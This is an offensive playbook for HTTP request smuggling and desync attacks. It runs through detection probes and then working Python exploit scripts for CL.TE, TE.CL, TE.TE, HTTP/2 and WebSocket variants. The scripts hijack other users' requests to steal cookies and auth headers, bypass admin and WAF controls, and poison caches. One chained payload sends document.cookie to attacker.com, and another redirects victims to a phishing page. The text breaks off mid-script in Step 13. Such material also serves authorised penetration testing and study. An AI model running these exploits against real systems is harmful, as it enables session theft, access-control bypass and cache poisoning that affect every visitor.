# Playbook: HTTP Request Smuggling & Desync Attacks

## Purpose
Detect and exploit HTTP Request Smuggling vulnerabilities caused by
front-end/back-end disagreements in how HTTP request boundaries are parsed.
Covers CL.TE, TE.CL, TE.TE, and HTTP/2 downgrade desync variants.
Input: target URL behind a reverse proxy, load balancer, or CDN.

---

## Theory — How Request Smuggling Works

HTTP smuggling exploits the ambiguity between `Content-Length` (CL) and
`Transfer-Encoding: chunked` (TE) headers. When a front-end proxy and a
back-end server disagree on where one request ends and the next begins,
an attacker can inject a partial request that gets prepended to the next
legitimate user's request.

### Variant Summary

| Variant | Front-end uses | Back-end uses | Who is "tricked" |
|---------|---------------|---------------|-------------------|
| CL.TE   | Content-Length | Transfer-Encoding | Front-end |
| TE.CL   | Transfer-Encoding | Content-Length | Back-end |
| TE.TE   | Transfer-Encoding | Transfer-Encoding | One side ignores obfuscated TE |
| H2.CL   | HTTP/2 framing | Content-Length | Back-end (after downgrade) |
| H2.TE   | HTTP/2 framing | Transfer-Encoding | Back-end (after downgrade) |

### Why it happens
- RFC 7230 says if both CL and TE are present, TE takes priority — but not all
  implementations follow this.
- HTTP/2 has explicit framing (no CL/TE needed), but many proxies downgrade
  HTTP/2 to HTTP/1.1 when forwarding to backends, reintroducing the ambiguity.
- Proxies and backends use different HTTP parsers with different tolerances
  for malformed headers.

---

## Step 1 — Identify Smuggling-Prone Targets

```bash
# Smuggling requires a proxy/backend chain. Look for:
# - CDN in front (CloudFront, Cloudflare, Akamai, Fastly)
# - Reverse proxy (nginx, HAProxy, Varnish, Envoy, Traefik)
# - Load balancer (ALB, ELB, F5)
# - WAF (Imperva, ModSecurity, AWS WAF)

# Fingerprint the stack
curl -sk -D- https://TARGET/ | head -30
# Look for: Server, Via, X-Served-By, X-Cache, X-Forwarded-For headers

# Check HTTP/2 support (needed for H2 smuggling)
curl -sk --http2 -D- https://TARGET/ -o /dev/null 2>&1 | head -20

# Nmap service detection
nmap -sV -p 80,443,8080,8443 TARGET

# Check if both CL and TE are accepted (basic prerequisite)
curl -sk -X POST https://TARGET/ \
  -H "Content-Length: 0" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\n" -D-
```

---

## Step 2 — Timing-Based Detection (Safe Probes)

Timing-based detection is the safest first step. The idea: send an ambiguous
request that causes one parser to wait for more data (timeout delay) while
the other considers the request complete.

### CL.TE Detection

If the front-end uses CL and the back-end uses TE, sending a CL that
covers the whole body but a chunked body that is incomplete will cause
the back-end to hang waiting for the terminating chunk.

```bash
# CL.TE timing probe — if this takes ~10s, CL.TE is likely
# Front-end reads 4 bytes (CL:4), sends "1\r\nZ" to back-end
# Back-end sees chunked, reads chunk of size 1 ("Z"), then waits for next chunk
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ' \
  | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
# Measure: did it hang or respond quickly?

# Python version (more precise timing)
python3 -c "
import socket, ssl, time

host = 'TARGET'
port = 443

payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: 4\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '1\r\nZ'
).format(host=host)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((host, port), timeout=15)
ssock = ctx.wrap_socket(sock, server_hostname=host)

start = time.time()
ssock.send(payload.encode())
try:
    ssock.recv(4096)
except socket.timeout:
    pass
elapsed = time.time() - start
ssock.close()

if elapsed > 5:
    print(f'[LIKELY CL.TE] Response took {elapsed:.1f}s (back-end hung waiting for chunk)')
else:
    print(f'[NOT CL.TE] Response took {elapsed:.1f}s (no delay)')
"
```

### TE.CL Detection

If the front-end uses TE and the back-end uses CL, send a valid chunked
body but with a CL smaller than the actual body. The back-end will process
CL bytes and leave the rest in the buffer.

```bash
# TE.CL timing probe
# Front-end sees valid chunked encoding, forwards everything
# Back-end uses CL:6, reads only "0\r\n\r\n" (the terminating chunk)
# and leaves "X" in the buffer — but timing wise, back-end responds fast
# while front-end may hang if back-end socket behavior differs
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' \
  | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
```

---

## Step 3 — Differential Response Detection (Confirmatory)

Timing alone can have false positives. Confirm with differential responses:
send a smuggled prefix that causes the next request to hit a different
endpoint or return a different status code.

### CL.TE Confirmation

```bash
# Step A: Send the smuggle payload
# Front-end sees CL:35, sends 35 bytes to back-end
# Back-end sees TE:chunked, processes "0\r\n\r\n" as end of request
# and leaves "GET /404-confirm HTTP/1.1\r\nX: " in the buffer
python3 -c "
import socket, ssl

host = 'TARGET'
smuggled = 'GET /404-confirm HTTP/1.1\r\nX: '
body = '0\r\n\r\n' + smuggled

payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print('Smuggle sent. Response:')
print(ssock.recv(4096).decode(errors='replace'))
ssock.close()
"

# Step B: Immediately send a normal GET request on the same connection
# If smuggling worked, the back-end prepends the smuggled prefix to this
# request, resulting in "GET /404-confirm HTTP/1.1\r\nX: GET / HTTP/1.1..."
# which should return 404 instead of 200
curl -sk https://TARGET/ -o /dev/null -w "%{http_code}"
# If this returns 404 or an unexpected response, CL.TE is confirmed
```

### TE.CL Confirmation

```bash
python3 -c "
import socket, ssl

host = 'TARGET'
smuggled_body = 'GET /404-confirm HTTP/1.1\r\nHost: {host}\r\n\r\n'.format(host=host)
chunk = '{size:x}\r\n{data}\r\n0\r\n\r\n'.format(size=len(smuggled_body), data=smuggled_body)

# CL covers only the first line of the chunk ('0\r\n\r\n' = 5 bytes)
# Front-end sees chunked, reads the full chunk and forwards it all
# Back-end sees CL:5, reads '0\r\n\r\n' portion, leaves rest in buffer
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: 5\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{chunk}'
).format(host=host, chunk=chunk)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print('Smuggle sent. Response:')
print(ssock.recv(4096).decode(errors='replace'))
ssock.close()
"
```

---

## Step 4 — CL.TE Exploitation

### Request Hijacking (Steal Next User's Request)

```bash
# Smuggle a POST to an endpoint that reflects/stores body content
# The next user's full request (including cookies, auth headers) gets
# appended as the body of the smuggled POST
python3 -c "
import socket, ssl

host = 'TARGET'

# The smuggled request — a POST that stores body content
# (comment form, search field, profile update, etc.)
smuggled = (
    'POST /comment HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Type: application/x-www-form-urlencoded\r\n'
    'Content-Length: 800\r\n'
    '\r\n'
    'comment='
).format(host=host)

# Build CL.TE payload
body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(4096).decode(errors='replace'))
ssock.close()

print()
print('[*] Now the next user request to this back-end will have their')
print('    full request (cookies, headers) captured as the comment body.')
print('[*] Check the comment/search results page for leaked data.')
"
```

### Bypassing Front-End Access Controls

```bash
# If /admin is blocked by the front-end proxy but not the back-end:
python3 -c "
import socket, ssl

host = 'TARGET'
smuggled = (
    'GET /admin HTTP/1.1\r\n'
    'Host: {host}\r\n'
    '\r\n'
).format(host=host)

body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
resp = ssock.recv(8192).decode(errors='replace')
print(resp)
ssock.close()
"
```

---

## Step 5 — TE.CL Exploitation

### Chunked Encoding Tricks

```bash
# TE.CL: front-end processes chunked, back-end uses Content-Length
python3 -c "
import socket, ssl

host = 'TARGET'

smuggled = (
    'GET /admin HTTP/1.1\r\n'
    'Host: {host}\r\n'
    '\r\n'
).format(host=host)

# Wrap smuggled request in a chunk
chunk_size = hex(len(smuggled))[2:]
chunked_body = '{size}\r\n{data}\r\n0\r\n\r\n'.format(size=chunk_size, data=smuggled)

# CL is set small — back-end only reads this many bytes
# and leaves the smuggled request in the socket buffer
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: 4\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, body=chunked_body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(8192).decode(errors='replace'))
ssock.close()
"
```

---

## Step 6 — TE.TE Obfuscation Techniques

When both front-end and back-end support Transfer-Encoding, but one of
them can be tricked into ignoring a malformed TE header, the request
degrades to CL.TE or TE.CL depending on which side is confused.

```bash
# Transfer-Encoding obfuscation variants to test
# Send each and measure timing/behavior differences

OBFUSCATIONS=(
  "Transfer-Encoding: chunked"                    # baseline (valid)
  "Transfer-Encoding: xchunked"                   # typo — some parsers reject
  "Transfer-Encoding : chunked"                   # space before colon
  "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"  # duplicate header
  "Transfer-Encoding:\tchunked"                   # tab instead of space
  "Transfer-Encoding: \tchunked"                  # leading tab
  "Transfer-encoding: chunked"                    # lowercase
  "Transfer-Encoding: CHunked"                    # mixed case
  "Transfer-Encoding: chunked\r\n"               # trailing whitespace in value
  "X: x\r\nTransfer-Encoding: chunked"           # preceded by another header
  "Transfer-Encoding:\nchunked"                   # bare LF in header
  "Transfer-Encoding: chunked, identity"          # multiple values
  "Transfer-Encoding: identity, chunked"          # reversed order
  "Transfer-Encoding: chunked\x00"               # null byte
)

# Test each obfuscation with a CL.TE timing probe
python3 << 'PYEOF'
import socket, ssl, time

host = "TARGET"
port = 443

obfuscations = [
    "Transfer-Encoding: chunked",
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding:\tchunked",
    "Transfer-encoding: chunked",
    "Transfer-Encoding: CHunked",
    "Transfer-Encoding: chunked, identity",
    "Transfer-Encoding: identity, chunked",
]

for te in obfuscations:
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "{te}\r\n"
        "\r\n"
        "1\r\nZ"
    ).format(host=host, te=te)

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((host, port), timeout=10)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        start = time.time()
        ssock.send(payload.encode())
        try:
            ssock.recv(4096)
        except:
            pass
        elapsed = time.time() - start
        ssock.close()
        status = "DELAYED" if elapsed > 5 else "NORMAL"
        print(f"[{status}] {elapsed:.1f}s — {te!r}")
    except Exception as e:
        print(f"[ERROR] {te!r} — {e}")
PYEOF
```

---

## Step 7 — HTTP/2 Smuggling (H2.CL, H2.TE, WebSocket)

HTTP/2 uses binary framing — there is no CL or TE in the wire format.
But when the front-end downgrades H2 to H1 for the back-end, it may
reconstruct CL/TE headers, creating smuggling opportunities.

### H2.CL — Content-Length Mismatch

```bash
# The front-end accepts H2, ignores CL (uses frame length).
# The back-end receives H1 with the attacker-controlled CL header.
# If CL < actual body, the back-end leaves trailing bytes in the buffer.

# Using h2csmuggler (for cleartext H2 upgrade)
pip install h2
git clone https://github.com/BishopFox/h2cSmuggler.git

# Test if target supports H2C upgrade
python3 h2cSmuggler/h2csmuggler.py -x https://TARGET/ --test

# Smuggle a request via H2C
python3 h2cSmuggler/h2csmuggler.py -x https://TARGET/ \
  -X POST -d '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n'
```

### H2.TE — Injecting Transfer-Encoding

```bash
# HTTP/2 forbids Transfer-Encoding, but some proxies don't strip it
# when downgrading to HTTP/1.1

# Using curl with explicit H2 and injected TE header
# (curl normally strips TE for H2, so we use a custom tool)

python3 << 'PYEOF'
import h2.connection
import h2.config
import h2.events
import socket, ssl

host = "TARGET"
port = 443

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

sock = socket.create_connection((host, port))
ssock = ctx.wrap_socket(sock, server_hostname=host)

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssock.send(conn.data_to_send())

# Send request with injected Transfer-Encoding header
# (HTTP/2 spec forbids this, but some front-ends pass it through)
headers = [
    (":method", "POST"),
    (":path", "/"),
    (":authority", host),
    (":scheme", "https"),
    ("content-type", "application/x-www-form-urlencoded"),
    ("transfer-encoding", "chunked"),        # should be rejected by spec
]

smuggled = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)

conn.send_headers(1, headers)
conn.send_data(1, smuggled.encode(), end_stream=True)
ssock.send(conn.data_to_send())

resp = ssock.recv(65535)
events = conn.receive_data(resp)
for event in events:
    if hasattr(event, "data"):
        print(event.data.decode(errors="replace"))

ssock.close()
PYEOF
```

### WebSocket Smuggling

```bash
# If the front-end thinks a WebSocket upgrade succeeded but the
# back-end rejected it, the TCP connection becomes "unwatched" by
# the front-end, and raw HTTP can be tunneled through it.

python3 << 'PYEOF'
import socket, ssl

host = "TARGET"
port = 443

# Send a WebSocket upgrade that the back-end will reject
# but the front-end may consider successful
upgrade_request = (
    "GET /ws HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "\r\n"
).format(host=host)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, port), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)

ssock.send(upgrade_request.encode())
resp = ssock.recv(4096).decode(errors="replace")
print("[*] Upgrade response:")
print(resp[:500])

if "101" in resp or "200" in resp:
    # Front-end thinks WebSocket is established
    # Now send raw HTTP through the "WebSocket" tunnel
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "\r\n"
    ).format(host=host)
    ssock.send(smuggled.encode())
    print("[*] Smuggled response:")
    print(ssock.recv(8192).decode(errors="replace"))

ssock.close()
PYEOF
```

---

## Step 8 — Impact Scenarios

### Cache Poisoning via Smuggling

```bash
# Smuggle a request that makes the cache store attacker-controlled
# content for a legitimate URL

python3 -c "
import socket, ssl

host = 'TARGET'

# Smuggled request: makes back-end respond with attacker's content
# for the URL that the next user requests
smuggled = (
    'GET /static/main.js HTTP/1.1\r\n'
    'Host: attacker.com\r\n'           # back-end fetches from attacker
    '\r\n'
)

body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(8192).decode(errors='replace'))
ssock.close()

print()
print('[*] If a CDN/cache is in front, the malicious response may be')
print('    cached and served to all subsequent visitors of /static/main.js')
"
```

### Credential Theft (Session Hijacking)

```bash
# Same as request hijacking in Step 4 — smuggle a POST to a
# reflection/storage endpoint with a large Content-Length.
# The next user's request (including Cookie, Authorization headers)
# is captured as the POST body.

# After smuggling, check:
# 1. Comment/post/search page for leaked headers
# 2. Profile/settings page if POST was to a profile update endpoint
# 3. Error pages that reflect request body
```

### WAF/Security Control Bypass

```bash
# Front-end WAF blocks requests containing SQL injection patterns.
# But the smuggled request bypasses the WAF entirely because the
# WAF only inspects the outer (legitimate) request.

python3 -c "
import socket, ssl

host = 'TARGET'

# The WAF will never see this — it only inspects the outer POST /
smuggled = (
    \"GET /search?q=' OR 1=1-- HTTP/1.1\r\n\"
    'Host: {host}\r\n'
    '\r\n'
).format(host=host)

body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(8192).decode(errors='replace'))
ssock.close()
"
```

---

## Step 9 — Tools

### smuggler.py (defparam)

```bash
# https://github.com/defparam/smuggler
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Basic scan
python3 smuggler.py -u https://TARGET/

# Scan with specific method
python3 smuggler.py -u https://TARGET/ -m POST

# Scan multiple targets
cat targets.txt | python3 smuggler.py

# Verbose mode for debugging
python3 smuggler.py -u https://TARGET/ -v
```

### HTTP Request Smuggler (Burp Extension)

```
1. BApp Store -> Install "HTTP Request Smuggler"
2. Right-click target in Proxy history -> Extensions -> HTTP Request Smuggler -> Smuggle probe
3. Check Results tab for findings
4. Use "Turbo Intruder" for follow-up exploitation

Key settings:
- Enable "CL.TE" and "TE.CL" detection
- Set timeout to 10s for timing-based detection
- Enable "differential responses" mode for confirmation
```

### h2csmuggler (BishopFox)

```bash
# https://github.com/BishopFox/h2cSmuggler
git clone https://github.com/BishopFox/h2cSmuggler.git
pip install h2

# Test for H2C support
python3 h2cSmuggler/h2csmuggler.py -x https://TARGET/ --test

# Smuggle request to /admin
python3 h2cSmuggler/h2csmuggler.py -x https://TARGET/ \
  -X GET -p /admin

# Through specific proxy path
python3 h2cSmuggler/h2csmuggler.py -x https://TARGET/api/ \
  -X GET -p /internal/status

# Scan multiple targets
cat urls.txt | python3 h2cSmuggler/h2csmuggler.py --test
```

### Turbo Intruder (Burp — for Exploitation)

```python
# Turbo Intruder script for CL.TE smuggling
# Paste in Turbo Intruder editor

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=10,
                           pipeline=False)

    # Smuggle attack — send on same connection
    attack = '''POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {cl}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\nX-Ignore: '''.format(host=target.baseInput.host, cl=66)

    follow = '''GET / HTTP/1.1\r\nHost: {host}\r\n\r\n'''.format(host=target.baseInput.host)

    engine.queue(attack)
    engine.queue(follow)
    engine.queue(follow)
    engine.queue(follow)

def handleResponse(req, interesting):
    table.add(req)
```

### Simple Python Smuggle Scanner

```python
#!/usr/bin/env python3
"""Minimal HTTP smuggling detector. Tests CL.TE and TE.CL timing."""

import socket
import ssl
import sys
import time

def test_smuggle(host, port=443, use_tls=True, timeout=10):
    results = []

    probes = {
        "CL.TE": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "1\r\nZ"
        ),
        "TE.CL": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        ),
    }

    for name, template in probes.items():
        payload = template.format(host=host)
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            start = time.time()
            sock.send(payload.encode())
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
            elapsed = time.time() - start
            sock.close()

            if elapsed > 5:
                results.append(f"[LIKELY {name}] {elapsed:.1f}s delay detected")
            else:
                results.append(f"[NO {name}] {elapsed:.1f}s — no delay")
        except Exception as e:
            results.append(f"[ERROR {name}] {e}")

    return results

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "TARGET"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443

    print(f"Testing {host}:{port} for HTTP smuggling...")
    for result in test_smuggle(host, port):
        print(result)
```

---

## Step 10 — Real-World Server Behaviors

### Apache (httpd)

```
- Apache typically uses CL over TE when both are present (non-RFC behavior)
- mod_proxy may forward both headers without stripping
- Apache 2.4.49/2.4.50: path traversal (CVE-2021-41773/42013) can chain with smuggling
- Apache Traffic Server (ATS): historically vulnerable to multiple smuggling variants
  ATS < 8.0.8 / 9.0.2 — CL.TE and TE.TE via header obfuscation
```

### nginx

```
- nginx prioritizes TE over CL (RFC-compliant)
- But: nginx does not normalize TE header — passes obfuscated TE headers to back-end
- nginx + gunicorn: classic CL.TE pair (gunicorn historically used CL when both present)
- nginx + Node.js: TE.CL possible (older Node HTTP parser issues)
- Tip: test "Transfer-Encoding : chunked" (space before colon) — nginx rejects,
  but if the back-end accepts it, you get TE.CL
```

### HAProxy

```
- HAProxy is strict about HTTP parsing by default
- But: HAProxy < 2.0.25 had smuggling via HTTP/0.9 responses
- HAProxy in "http" mode processes TE; in "tcp" mode passes everything raw
- Test: dual TE headers ("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity")
  — HAProxy may use first, back-end may use second
```

### CloudFront (AWS)

```
- CloudFront normalizes requests heavily, stripping many attack vectors
- But: H2->H1 downgrade path has had smuggling issues (2019-2021)
- CloudFront + Apache/Tomcat back-end: test CL.TE
- CloudFront historically forwarded Transfer-Encoding: chunked, identity
- Test: POST with TE:chunked where CloudFront uses CL for routing
```

### Cloudflare

```
- Cloudflare strips duplicate/malformed TE headers (strong normalization)
- Historically harder to smuggle through
- But: H2 downgrade path worth testing — Cloudflare terminates H2,
  may add CL when forwarding as H1
- Test: H2.CL variant if back-end is accessible via Cloudflare
- Cloudflare Workers may introduce new parsing differences
```

### Akamai / Fastly

```
- Akamai: test TE obfuscation variants — different normalization than Cloudflare
- Fastly (Varnish-based): Varnish historically had chunked encoding edge cases
- Both: focus on H2 downgrade smuggling as the most likely vector on modern configs
```

---

## Step 11 — Chaining Smuggling with Other Vulnerabilities

### Smuggling + Reflected XSS

```bash
# If /search?q=<payload> has reflected XSS but WAF blocks it:
# Smuggle the XSS request past the WAF

python3 -c "
import socket, ssl

host = 'TARGET'

smuggled = (
    'GET /search?q=<script>document.location=\"https://attacker.com/steal?\"+document.cookie</script> HTTP/1.1\r\n'
    'Host: {host}\r\n'
    '\r\n'
).format(host=host)

body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(8192).decode(errors='replace'))
ssock.close()
"
```

### Smuggling + Cache Poisoning + XSS (Full Chain)

```bash
# 1. Find a cacheable endpoint (e.g., /static/app.js or /)
# 2. Smuggle a request that causes the back-end to return XSS content
# 3. The cache stores the poisoned response
# 4. All users visiting the cached URL get XSSed

# Step 1: Identify cacheable responses
curl -sk -D- https://TARGET/ | grep -iE "(cache-control|age|x-cache|cf-cache)"

# Step 2: Smuggle — make back-end serve XSS for cached URL
python3 -c "
import socket, ssl

host = 'TARGET'

# Smuggle: next request to / gets redirected to attacker
# (if back-end has open redirect or Host header injection)
smuggled = (
    'GET / HTTP/1.1\r\n'
    'Host: attacker.com\r\n'         # Host header poisoning
    'X-Forwarded-Host: attacker.com\r\n'
    '\r\n'
)

body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(8192).decode(errors='replace'))
ssock.close()
"

# Step 3: Verify cache poisoning
curl -sk -D- https://TARGET/ | head -20
# If Location header points to attacker.com, cache is poisoned
```

### Smuggling + Open Redirect

```bash
# Smuggle a request to an open redirect endpoint to redirect victim
# to attacker-controlled site (phishing, OAuth token theft)

python3 -c "
import socket, ssl

host = 'TARGET'

smuggled = (
    'GET /redirect?url=https://attacker.com/phish HTTP/1.1\r\n'
    'Host: {host}\r\n'
    '\r\n'
).format(host=host)

body = '0\r\n\r\n' + smuggled
payload = (
    'POST / HTTP/1.1\r\n'
    'Host: {host}\r\n'
    'Content-Length: {cl}\r\n'
    'Transfer-Encoding: chunked\r\n'
    '\r\n'
    '{body}'
).format(host=host, cl=len(body), body=body)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((host, 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname=host)
ssock.send(payload.encode())
print(ssock.recv(8192).decode(errors='replace'))
ssock.close()

print()
print('[*] Next user visiting this back-end will be redirected to attacker.com')
print('[*] If combined with OAuth flow, the redirect can steal auth codes')
"
```

---

## Step 12 — Defensive Notes & Edge Cases

```
- Connection: keep-alive is essential — smuggling requires request pipelining
  on the same TCP connection. If the server closes after each request, no smuggling.
- Some targets use HTTP/2 end-to-end (no downgrade) — H1 smuggling is impossible,
  but H2-specific desync may still work.
- Rate limiting: smuggling probes can disrupt other users on the same back-end.
  Test during low-traffic windows or on staging if available.
- False positives: timing probes can be affected by network latency and server load.
  Always confirm with differential response tests.
- Request splitting vs smuggling: splitting (CRLF injection in headers) is related
  but distinct. If you find CRLF injection in a header value, test if it enables
  smuggling-like attacks.
```

---

## Output

```
PLAYBOOK : HTTP Request Smuggling & Desync
TARGET   : [URL/domain]
---
STEP N   : [step name]
STATUS   : [DONE / SKIP / BLOCKED]
RESULT   : [finding or output]
---
FINDINGS SUMMARY
  [CRITICAL] CL.TE confirmed — request hijacking possible, credential theft demonstrated
  [CRITICAL] Cache poisoning via smuggling — all users affected
  [HIGH]     TE.TE obfuscation bypasses front-end WAF
  [HIGH]     H2.CL downgrade smuggling — /admin accessible
  [MEDIUM]   Timing anomaly detected but differential response inconclusive
  [INFO]     HTTP/2 supported, downgrade to H1 confirmed
---
NEXT STEPS
  1. If CRITICAL: Load 03_reporting/report_writer.md immediately
  2. Chain with xss_playbook.md if reflected XSS exists behind WAF
  3. Chain with cors_misconfiguration.md if CORS is exploitable via smuggled origin
  4. Test all TE.TE obfuscation variants if initial probes fail
  5. Check H2 downgrade path even if H1 smuggling fails
```

---

## Step 13 — HTTP/2 CONNECT Technique (PortSwigger Top 10 2025 #9)

HTTP/2 introduced the CONNECT method as a mechanism for establishing tunnels
through proxies. While this is not new in itself, the way HTTP/2 implementations
handle CONNECT requests has reintroduced classic vulnerabilities -- internal
port scanning, SSRF-like access to backend services, and full request smuggling
-- in environments that were previously considered hardened.

### Background: New Protocols, Old Vulnerabilities

Every time a new protocol layer is introduced (HTTP/2, HTTP/3, WebTransport),
implementations must re-solve problems that were already addressed in HTTP/1.1.
The HTTP/2 CONNECT method is a textbook example: proxies that carefully
validated HTTP/1.1 CONNECT requests may accept HTTP/2 CONNECT with far less
scrutiny because the code paths are different and newer (less battle-tested).

The core issue: HTTP/2 CONNECT can specify a target host and port in the
`:authority` pseudo-header. If the front-end proxy does not restrict which
hosts and ports can be reached via CONNECT, the attacker effectively gains
SSRF-like access to internal services through the proxy itself.

### Internal Port Scanning via HTTP/2 CONNECT

```bash
# Test if the target proxy accepts HTTP/2 CONNECT to arbitrary hosts/ports
# This requires an HTTP/2-capable client that can send CONNECT requests

python3 << 'PYEOF'
import h2.connection
import h2.config
import h2.events
import socket
import ssl

proxy_host = "TARGET"
proxy_port = 443

# Internal targets to probe
internal_targets = [
